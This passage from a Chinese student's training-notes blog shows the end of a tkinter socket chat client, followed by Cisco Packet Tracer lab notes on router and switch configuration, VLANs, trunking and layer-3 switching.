nickname<span class="token punctuation">)</span>    <span class="token comment"># name_text = StringVar()</span>    <span class="token comment"># name_text.set(UserList)  # 用户列表文本设置</span>    <span class="token comment"># listbox1 = Listbox(root, listvariable=name_text)  # 用户列表，使用Listbox组件</span>    <span class="token comment"># listbox1.place(x=5, y=0, width=500, height=400)</span>    img_png <span class="token operator">=</span> PhotoImage<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'QQ图片20220901201640.png'</span><span class="token punctuation">)</span>    label_img <span class="token operator">=</span> Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span> image<span class="token operator">=</span>img_png<span class="token punctuation">)</span>    label_img<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">400</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">350</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">300</span><span class="token punctuation">)</span>    <span class="token comment">#聊天界面</span>    <span class="token comment"># content = client.recv(2048).decode('utf-8')</span>    ChatBox <span class="token operator">=</span> scrolledtext<span class="token punctuation">.</span>ScrolledText<span class="token punctuation">(</span>root<span class="token punctuation">)</span>  <span class="token comment"># 聊天信息窗口，使用ScrolledText组件制作</span>    ChatBox<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">470</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">300</span><span class="token punctuation">)</span>    <span class="token comment"># ChatBox.pack()</span>    <span class="token comment"># ChatBox.insert('end',content)</span>    <span class="token keyword">def</span> <span class="token function">read_server</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            content <span class="token operator">=</span> c<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            ChatBox<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token operator">+</span>content<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>            ChatBox<span class="token punctuation">.</span>see<span class="token punctuation">(</span>tkinter<span class="token punctuation">.</span>END<span class="token punctuation">)</span>  <span class="token comment"># ScrolledText组件方法，自动定位到结尾，否则只有消息在涨，窗口拖动条不动</span>            ChatBox<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 更新聊天信息窗口，显示新的信息</span>    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read_server<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#聊天输入框</span>    word <span class="token operator">=</span> StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span>    word<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>    SentBox <span class="token operator">=</span> Entry<span class="token punctuation">(</span>root<span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">140</span><span class="token punctuation">,</span>textvariable<span class="token operator">=</span>word<span class="token punctuation">)</span> <span class="token comment">#建一个输入框</span>    SentBox<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">305</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">475</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">90</span><span class="token punctuation">)</span> <span class="token comment">#设置大小和位置</span>    <span class="token comment">#发送按钮</span>    <span class="token keyword">def</span> <span class="token function">sendtext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        content <span class="token operator">=</span> word<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获得文本内容</span>        <span class="token keyword">if</span> content<span class="token operator">==</span><span class="token string">'end'</span><span class="token punctuation">:</span>            client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        word<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token comment">#用了一个标记记录点击的状态，不管内容是什么点了就变</span>    sendButton <span class="token operator">=</span> Button<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">'发 送'</span><span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Fangsong'</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">,</span> bg<span class="token operator">=</span><span class="token string">'white'</span><span class="token punctuation">,</span> command<span class="token operator">=</span>sendtext<span class="token punctuation">)</span>    sendButton<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">490</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">308</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">150</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">85</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>LoginWindow<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="实训二阶段"><a href="#实训二阶段" class="headerlink" title="实训二阶段"></a>实训二阶段</h1><blockquote><p><a href="https://blog.csdn.net/Protinx/article/details/124586695">(29条消息) Cisco Packet Tracer安装详解_@Protinx的博客-CSDN博客_cisco packet tracer</a></p><p> <a href="https://so.csdn.net/so/search?q=%E6%80%9D%E7%A7%91%E6%A8%A1%E6%8B%9F%E5%99%A8&spm=1001.2101.3001.7020">思科模拟器</a>Cisco Packet <a href="https://so.csdn.net/so/search?q=Tracer&spm=1001.2101.3001.7020">Tracer</a>是一个功能强大的网络仿真程序，允许学生实验与网络行为。但是这个软件是纯软件模拟，和真实的环境有差距，命令也不全。适合新手教程教学使用。</p><p><a href="https://blog.csdn.net/qq_41625827/article/details/106115226">(29条消息) 思科Packet Tracer基础使用教程_冰镇阔落的博客-CSDN博客_cisco packet tracer教程</a></p><p><a href="https://blog.csdn.net/qq_43598138/article/details/104317148">(29条消息) Cisco Packet Tracer软件介绍与使用方法_发光吖的博客-CSDN博客_packet tracer</a></p><ul><li><p>一般选择高型号的路由器（可支持的命令比较多），在Packet Tracer 5.3里面推荐选择2811系列路由器。</p></li><li><p>交换机也选择高型号的，推荐选择2960系列。（注：2xxx系列为二层交换机，3xxx系列为三层交换机。两者交换功能相同，但三层交换机多了路由功能，在一些情况下三层交换机可以代替路由器，但不能完全替代路由器）</p><p>交换机（Switch）意为“<a href="https://baike.baidu.com/item/%E5%BC%80%E5%85%B3/2275072?fromModule=lemma_inlink">开关</a>”是一种用于电（光）信号转发的<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/7667828?fromModule=lemma_inlink">网络设备</a>。它可以为接入交换机的任意两个<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E8%8A%82%E7%82%B9/9338583?fromModule=lemma_inlink">网络节点</a>提供独享的电信号通路。</p></li><li><p>一般情况下选择（自动线）即可，或选择（直通线）。若方案要求选择专线，则需要选择（专线）。方案中线路大多为直通线（即以太网线），少数会有专线要求。<br> 点击一下所要使用的线，然后点击需要连线的设备接口，从一个设备接口连线至另一个设备接口。（注：自动线不需要选择接口，其他两种线需要手动选择接口。直通线选择Fast开头的接口，专线选择Serial开头的接口）<br>注：自动线连好为虚线；直通线连好为实线。</p></li></ul><p>交换机是用来连接局域网的，路由器是用来连接互联网的（也可以连接多个局域网）</p></blockquote><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220902192351180.png" alt="image-20220902192351180" style="zoom: 50%;" /><p>各线缆两端有不同颜色的圆点，它们分别表示什么样的含义呢？</p><table><thead><tr><th>链路圆点的状态</th><th>含义</th></tr></thead><tbody><tr><td>亮绿色</td><td>物理连接准备就绪，还没有Line Protocol status 的指示</td></tr><tr><td>闪烁的绿色</td><td>连接激活</td></tr><tr><td>红色</td><td>物理连接不通，没有信号</td></tr><tr><td>黄色</td><td>交换机端口处于”阻塞”状态</td></tr></tbody></table><blockquote><p>路由器和交换机区别</p><ul><li>路由器：寻址，转发（依靠 IP 地址），交换机：过滤，转发（依靠 MAC 地址）</li><li>交换机用于连接局域网，数据包在局域网内网的数据转发，路由器用于连接局域网和外网，数据包可以在不同局域网转发。</li><li>交换机工作于TCP/IP协议的最后一层数据链路层（物理层），路由器工作于网络层</li><li>交换机负责具体的数据包传输，路由器不负责包的实际传输，路由器只封装好要传输的数据包，然后交给交换机去传输（不一定是交换机，可能是其他传输技术），用java比喻大概简单理解为路由器是抽象类，定义好传输的数据包格式，交换机是具体实现类，也可以有其他实现类</li><li>交换机没有MAC地址和IP地址，路由器有MAC地址和IP地址（指纯碎的交换机和路由器，三层交换机是可以有IP地址的，路由器也有内置交换机功能的）<br>原文链接：<a href="https://blog.csdn.net/qq_21187515/article/details/119416934">https://blog.csdn.net/qq_21187515/article/details/119416934</a></li></ul></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">Router<span class="token operator">></span>enable Router<span class="token comment">#</span><span class="token punctuation">(</span>Router<span class="token operator">></span>en<span class="token punctuation">)</span>在用户模式下输入enable即可进入特权模式。第二级别模式，可以对设备进行所有的查看、测试及简单的配置。Router<span class="token comment">#configure terminal </span>Enter configuration commands<span class="token punctuation">,</span> one per line<span class="token punctuation">.</span>  End <span class="token keyword">with</span> CNTL<span class="token operator">/</span>Z<span class="token punctuation">.</span>Router<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#</span><span class="token punctuation">(</span>Router<span class="token comment">#conf t)</span>在特权模式下，输入configure terminal即可进入配置模式。第三级别模式，可以对设备进行管理配置。Router<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#interface fastEthernet 0/0</span>Router<span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span><span class="token comment">#</span><span class="token punctuation">(</span>Router<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#int fa0/0  //定义0/0接口)</span>其他配置模式Router<span class="token punctuation">(</span>config<span class="token operator">-</span>???<span class="token punctuation">)</span><span class="token comment">#。第四级别模式，可以对设备进行各种专用配置。如，进入配置设备接口的模式</span>Router<span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span><span class="token comment">#ip address 192.168.1.2 255.255.255.0</span><span class="token punctuation">(</span>Router<span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span><span class="token comment">#ip add 192.168.1.254 255.255.255.0)</span>配置ip地址R2<span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span><span class="token comment">#no shutdown</span><span class="token punctuation">(</span>Router<span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span><span class="token comment">#no sh)</span>激活接口<span class="token punctuation">(</span>Router<span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span><span class="token comment">#do wr)</span>Building configuration<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>Router<span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span><span class="token comment">#do show ip rou               //显示所有IP路由</span>C    <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token keyword">is</span> directly connected<span class="token punctuation">,</span> FastEthernet0<span class="token operator">/</span><span class="token number">0</span><span class="token operator">//</span>路由表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">路由器配置Router<span class="token operator">></span>enRouter<span class="token comment">#</span>Router<span class="token comment">#conf t</span>Router<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment">#int fa0/0                       //定义0/0接口</span>Router<span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span><span class="token comment">#ip add 192.168.1.254 255.255.255.0</span>Router<span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span><span class="token comment">#no sh </span>Router<span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span><span class="token comment">#int fa0/1                    //定义0/1接口</span>Router<span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span><span class="token comment">#ip add 192.168.2.254 255.255.255.0</span>Router<span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span><span class="token comment">#no sh                        //激活接口</span>Router<span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span><span class="token comment">#do wr</span>Router<span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span><span class="token comment">#do show ip rou               //显示所有IP路由</span>Codes<span class="token punctuation">:</span> C <span class="token operator">-</span> connected<span class="token punctuation">,</span> S <span class="token operator">-</span> static<span class="token punctuation">,</span> I <span class="token operator">-</span> IGRP<span class="token punctuation">,</span> R <span class="token operator">-</span> RIP<span class="token punctuation">,</span> M <span class="token operator">-</span> mobile<span class="token punctuation">,</span> B <span class="token operator">-</span> BGP       D <span class="token operator">-</span> EIGRP<span class="token punctuation">,</span> EX <span class="token operator">-</span> EIGRP external<span class="token punctuation">,</span> O <span class="token operator">-</span> OSPF<span class="token punctuation">,</span> IA <span class="token operator">-</span> OSPF inter area       N1 <span class="token operator">-</span> OSPF NSSA external <span class="token builtin">type</span> <span class="token number">1</span><span class="token punctuation">,</span> N2 <span class="token operator">-</span> OSPF NSSA external <span class="token builtin">type</span> <span class="token number">2</span>       E1 <span class="token operator">-</span> OSPF external <span class="token builtin">type</span> <span class="token number">1</span><span class="token punctuation">,</span> E2 <span class="token operator">-</span> OSPF external <span class="token builtin">type</span> <span class="token number">2</span><span class="token punctuation">,</span> E <span class="token operator">-</span> EGP       i <span class="token operator">-</span> IS<span class="token operator">-</span>IS<span class="token punctuation">,</span> L1 <span class="token operator">-</span> IS<span class="token operator">-</span>IS level<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> L2 <span class="token operator">-</span> IS<span class="token operator">-</span>IS level<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> ia <span class="token operator">-</span> IS<span class="token operator">-</span>IS inter area       <span class="token operator">*</span> <span class="token operator">-</span> candidate default<span class="token punctuation">,</span> U <span class="token operator">-</span> per<span class="token operator">-</span>user static route<span class="token punctuation">,</span> o <span class="token operator">-</span> ODR       P <span class="token operator">-</span> periodic downloaded static route Gateway of last resort <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token builtin">set</span> C    <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token keyword">is</span> directly connected<span class="token punctuation">,</span> FastEthernet0<span class="token operator">/</span><span class="token number">0</span>      <span class="token operator">//</span>路由表C    <span class="token number">192.168</span><span class="token number">.2</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token keyword">is</span> directly connected<span class="token punctuation">,</span> FastEthernet0<span class="token operator">/</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><a href="https://blog.csdn.net/qq_39524009/article/details/81073693">(29条消息) 交换机实验、VLAN创建_Air_Echo的博客-CSDN博客_创建vlan</a></p></blockquote><blockquote><p>打开<strong>【PC中 &gt;&gt; Desktop &gt;&gt; Commond prompt】</strong></p><p>pc0上 ping 192.168.20.1 (PC1)的ip地址</p></blockquote><blockquote><p><a href="https://blog.csdn.net/VariatioZbw/article/details/108212741">(29条消息) Cisco Packet Tracer 命令大全 【思科交换机模拟器命令大全】_zhangbw~的博客-CSDN博客_cisco packet tracer命令行</a></p><p><a href="https://blog.csdn.net/qq_40163937/article/details/88818072">(29条消息) Cisco Packet Tracer—VLAN配置详解_HOPEAMOR的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_34194317/article/details/92553357">(29条消息) cisco交换机 配置一组端口,interface range_weixin_34194317的博客-CSDN博客</a></p></blockquote><blockquote><p>当使用<strong>interface range</strong>命令时有如下的规则:</p><p>有效的组范围:<br>vlan从1 到4094<br>fastethernet 槽位/{first port} - {last port}, 槽位为0<br>gigabitethernet槽位/{first port} - {last port},槽位为0<br>port-channel port-channel-number - port-channel-number, port-channel号从1到64<br>端口号之间需要加入空格，如：interface range fastethernet 0/1 – 5 是有效的，而interface range fastethernet 0/1-5 是无效的.<br>interface range 命令只能配置已经存在的interface vlan<br>所有在同一组的端口必须是相同类别的。<br>见以下例子:</p><p>Switch# configure terminal<br>Switch(config)# interface range fastethernet0/1 - 5 </p></blockquote><blockquote><p><strong>#switch trunk encapsulation dot1q</strong></p><p> <strong>IEEE 802.1Q协议</strong>，是vlan的一种封装方式，是公有协议。 还有一种trunk协议，是ISL，也是vlan的一种封装方式，不过这是Cisco思科私有协议，其他厂商不能用。</p><p><strong>#switchport trunk</strong>是配置允许通过的vlan；<br>　　switchport mode trunk是将端口配置成trunk模式；<br>　　mode trunk //端口模式为trunk<br>　　switchport trunk encapsulation dot1q //trunk协议封装为dot1q<br>　　dot1q就是 IEEE 802.1Q协议，是vlan的一种封装方式，是公有协议。<br>　　还有一种trunk协议，是ISL，也是vlan的一种封装方式，不过这是Cisco思科私有协议，其他厂商不能用。</p></blockquote><h2 id="实训1：局域网分层结构"><a href="#实训1：局域网分层结构" class="headerlink" title="实训1：局域网分层结构"></a>实训1：局域网分层结构</h2><pre class="line-numbers language-none"><code class="language-none">1.基本任务三层交换上实现VLAN间路由；两层交换机上划分VLAN；VLAN数目不少于2个；自行规划IP地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>技术原理</p><ul><li>三层交换机具备网络层的功能，实现 VLAN 相互访问的原理是：利用三层交换机的路由功能，通过识别数据包的 IP 地址，查找路由表进行选路转发，三层交换机利用直连路由可以实现不同 VLAN 之间的相互访问。</li><li>三层交换机给接口配置 IP 地址。采用 SVI（交换虚拟接口）的方式实现 VLAN 间互连。<strong>SVI 是指为交换机中的VLAN 创建虚拟接口，并且配置 IP 地址</strong>。</li><li>Tag VLAN是基于交换机端口的一种类型，主要用于<strong>使交换机的相同Vlan内的主机之间</strong>可以直接访问，同时对于不同Vlan的主机进行隔离。</li><li>trunk主要用在<strong>连接其它交换机</strong>，以便在线路上承载多个vlanWLAN是Wireless Local Area Network的简称，指应用无线通信技术将计算机设备互联起来，构成可以互相通信和实现资源共享的网络体系。</li><li>802.1x协议是WLAN第二代的认证技术，它是基于客户端-服务器（Client-Server)结构的访问控制和认证协议。它可以限制未经授权的用户/设备通过接入端口（Access Port)访问LAN/WLAN。</li><li>DOT1Q是提供VLAN识别和服务质量(QoS)级别的IEEE标准。电气和电子工程师协会（IEEE，全称是Institute of Electrical and Electronics Engineers）是一个美国的电子技术与信息科学工程师的协会，是世界上最大的非营利性专业技术学会。</li><li>ip routing 启用IP路由功能no ip routing 关闭IP路由功能</li></ul></blockquote><blockquote><p><strong>二层交换机与三层交换机区别</strong></p><p>我们习惯说，<strong>在二层网络环境中相同vlan之间可以通信，不同vlan之间不可以通信，如果想通信必须借助三层设备</strong>，所以说<strong>三层交换机必须要做的事情是路由转发</strong>，但是二、三层交换机具体有什么区别呢？</p><ul><li><p>二层交换机工作于OSI模型的第2层(数据链路层)，故而称为二层交换机。二层交换技术发展比较成熟，二层交换机属数据链路层设备，可以<strong>识别数据包中的MAC地址信息，根据MAC地址进行转发</strong>，并将这些MAC地址与对应的端口记录在自己内部的一个地址表中。具体的工作流程如下：</p><p>（1） 当交换机从某个端口收到一个数据包，它先读取包头中的源MAC地址，这样它就知道源MAC地址的机器是连在哪个端口上的；</p><p>（2） 再去读取包头中的目的MAC地址，并在地址表中查找相应的端口；</p><p>（3） 如表中有与这目的MAC地址对应的端口，把数据包直接复制到这端口上；</p><p>（4） 如表中找不到相应的端口则把数据包广播到所有端口上，当目的机器对源机器回应时，交换机又可以学习一目的MAC地址与哪个端口对应，在下次传送数据时就不再需要对所有端口进行广播了。</p><p>​    不断的循环这个过程，对于全网的MAC地址信息都可以学习到，二层交换机就是这样建立和维护它自己的地址表。二层交换技术从网桥发展到VLAN（虚拟局域网），在局域网建设和改造中得到了广泛的应用。第二层交换技术是工作在OSI七层网络模型中的第二层，即数据链路层。它按照所接收到数据包的目的MAC地址来进行转发，对于网络层或者高层协议来说是透明的。<strong>它不处理网络层的IP地址</strong>，不处理高层协议的诸如TCP、UDP的端口地址，它只需要数据包的物理地址即MAC地址，<strong>数据交换是靠硬件来实现的，其速度相当快，这是二层交换的一个显著的优点</strong>。但是，它<strong>不能处理不同IP子网之间的数据交换</strong>。</p><p>​    传统的路由器可以处理大量的跨越IP子网的数据包，但是它的转发效率比二层低，因此要想利用二层转发效率高这一优点，又要处理三层IP数据包，三层交换技术就诞生了。</p></li><li><p>三层交换（也称多层交换技术，或IP交换技术）是相对于传统交换概念而提出的。众所周知，传统的交换技术是在OSI网络标准模型中的第二层——数据链路层进行操作的，而三层交换技术是在网络模型中的第三层实现了数据包的高速转发。简单地说，<strong>三层交换技术就是：二层交换技术＋三层转发技术。</strong>三层交换机就是具有部分路由器功能的交换机。三层交换机的最重要目的是加快大型局域网内部的数据交换，所具有的路由功能也是为这目的服务的，能够做到一次路由，多次转发。对于数据包转发等规律性的过程由硬件高速实现，而像路由信息更新、路由表维护、路由计算、路由确定等功能，由软件实现。三层交换技术就是二层交换技术+三层转发技术。三层交换技术的出现，解决了局域网中网段划分之后，网段中子网必须依赖路由器进行管理的局面，解决了传统路由器低速、复杂所造成的网络瓶颈问题。</p></li></ul></blockquote><p><img src="https://img2020.cnblogs.com/blog/1280419/202004/1280419-20200425105756156-1041750903.png" alt="img"></p><blockquote><p>实验步骤</p><p>1）在二层交换机上配置 VLAN2、VLAN3，分别将端口 2、端口 3 划分给 VLAN2、VLAN3。<br>（2）<strong>将二层交换机与三层交换机相连的端口 fa 0/1 都定义为 tag Vlan 模式。</strong><br>（3）在三层交换机上配置 VLAN2、VLAN3，此时验证二层交换机 VLAN2、VLAN3下的主机之间不能相互通信。<br>（4）设置三层交换机 VLAN 间的通信，创建 VLAN2,VLAN3 的虚接口，并配置虚接口 VLAN2、VLAN3 的 IP 地址。<br>（5）查看三层交换机路由表。<br>（6）将二层交换机 VLAN2、VLAN3 下的主机默认网关分别设置为相应虚拟接口的 IP 地址。<br>（7）验证二层交换机 VLAN2,VALN3 下的主机之间可以相互通信。</p></blockquote><blockquote><p><strong>switchport access vlan 3</strong><br>语法：<br>switchport access vlan vlan-id<br>no switchport access vlan</p><p><strong>该命令把一个Access接口指派给一个VLAN</strong>。使用 no 选项可以把接口指派到缺省的VLAN中。</p><p>缺省值：接口缺省的VLAN是 VLAN 1。</p><p>命令模式：接口配置模式</p><p>适用接口：2层物理接口。</p><p>说明：如果指定的VLAN不存在，则系统会创建这个VLAN，并把接口设置为该VLAN的成员。如果指定的VLAN已经存在，则把接口添加到该VLAN中。如果接口是一个Trunk口，该操作没有任何作用。可以用 show vlan 命令查看VLAN信息。</p><p>范例：<br>Ruijie(config)# interface f0/1<br>Ruijie(config)# switchport<br>Ruijie(config-if)# switchport access vlan 10<br>本例把 <strong>FastEthernat 0/1 口设置为2层口，并把它加入到 VLAN 10 中。</strong></p><p><strong>#switchport mode trunk</strong></p><p>语法：</p><p>switchport mode { access | trunk }</p><p>no switchport mode</p><p>该命令<strong>指定一个2层接口的模式，可以把接口指定为 access 接口或者 trunk 接口。</strong>使用 no 选项可以把接口模式恢复为缺省值。</p><p>缺省值：接口的缺省模式是 access。</p><p>命令模式：接口配置模式</p><p>适用接口：2层物理接口、2层Aggregateport接口。</p><p>说明：如果一个接口的模式是 access，则该接口只能成为一个VLAN的成员，可以使用 switchport access vlan 命令把它指定给一个VLAN；如果一个接口的模式是 trunk，则该接口可以是多个VLAN的成员，可以用 switchport trunk 命令定义许可VLAN列表决定它所在的VLAN。</p><p>范例：</p><p>Ruijie(config)# interface f0/1<br>Ruijie(config-if)# switchport mode trunk<br><strong>本例把 FastEthernat 0/1 口设置为 Trunk 接口。</strong></p><p><a href="https://blog.csdn.net/ahleung/article/details/100102099">(29条消息) Switchport详细用法_天地良心的博客-CSDN博客</a></p></blockquote><blockquote><p>三个空的的口令分别是：</p><ol><li>interface e0 //根据图示这个是E0口。</li><li>192.168.2.1 255.255.255.0 //R1的S0接口的IP地址和子网掩码。</li><li>s0 //这个是送出接口</li></ol><p><strong>ip routing 是用在三层交换机上打开路由功能，默认是关闭的</strong>，ip router ospf 是在路由器上启用ospf等路由协议，ospf后面还要加个进程号，范围是0-65535，只具有本地意义</p><p>ip routing启用IP路由功能：</p><ol><li><p>配置三层交换机启动路由功能：ip routing 。</p></li><li><p>配置VLAN IP地址：</p><p>interface vlan vlan-id                </p><p>Ip address ip-address subnet-mask                </p><p>No shutdown</p></li><li><p>配置接口为三层模式：</p><p>no switchport</p></li><li><p>配置DHCP中继转发：</p><p>int vlan vlan-i</p><p>Ip helper-address Dhcpserver-address</p></li><li><p>配置静态路由：</p><p>ip route targetnet-address netmask nexthop-address</p></li><li><p>配置RIP协议：</p><p>router rip</p></li><li><p>查看FIB表：</p><p>show ip cef</p></li><li><p>查看邻接关系表：</p><p>show adjacency detail</p></li><li><p>查看路由表：</p><p>show ip route</p></li></ol></blockquote><blockquote><p>PC1    IP: 192.168.1.2   Submark: 255.255.255.0   Gateway: 192.168.1.1 </p><p>PC2    IP: 192.168.2.2   Submark: 255.255.255.0   Gateway: 192.168.2.1 </p><p>PC3    IP: 192.168.1.3   Submark: 255.255.255.0   Gateway: 192.168.1.1</p><p>二层交换机<br><strong>Switch&gt;en</strong><br><strong>Switch#conf t</strong><br>Enter configuration commands, one per line. End with CNTL/Z.</p><p><strong>Switch(config)#vlan 2</strong><br><strong>Switch(config-vlan)#exit</strong><br><strong>Switch(config)#vlan 3</strong></p><p><strong>Switch(config-vlan)#int fa 0/2</strong><br><strong>Switch(config-if)#switchport access vlan 2</strong><br>Switch(config-if)#int fa 0/3<br>Switch(config-if)#switchport access vlan 3</p><p><strong>Switch(config-if)#int fa 0/1</strong><br><strong>Switch(config-if)#switchport mode trunk</strong></p><p>%LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/1, changed state to down</p><p>%LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/1, changed state to up</p><p><strong>Switch(config-if)#end</strong><br>Switch#<br>%SYS-5-CONFIG_I: Configured from console by console</p><p><strong>Switch#show vlan</strong></p><p>VLAN Name Status Ports</p><hr><p>1 default active Fa0/4, Fa0/5, Fa0/6, Fa0/7<br>Fa0/8, Fa0/9, Fa0/10, Fa0/11<br>Fa0/12, Fa0/13, Fa0/14, Fa0/15<br>Fa0/16, Fa0/17, Fa0/18, Fa0/19<br>Fa0/20, Fa0/21, Fa0/22, Fa0/23<br>Fa0/24, Gig1/1, Gig1/2<br>2 VLAN0002 active Fa0/2<br>3 VLAN0003 active Fa0/3<br>1002 fddi-default act/unsup<br>1003 token-ring-default act/unsup<br>1004 fddinet-default act/unsup<br>1005 trnet-default act/unsup</p><p>VLAN Type 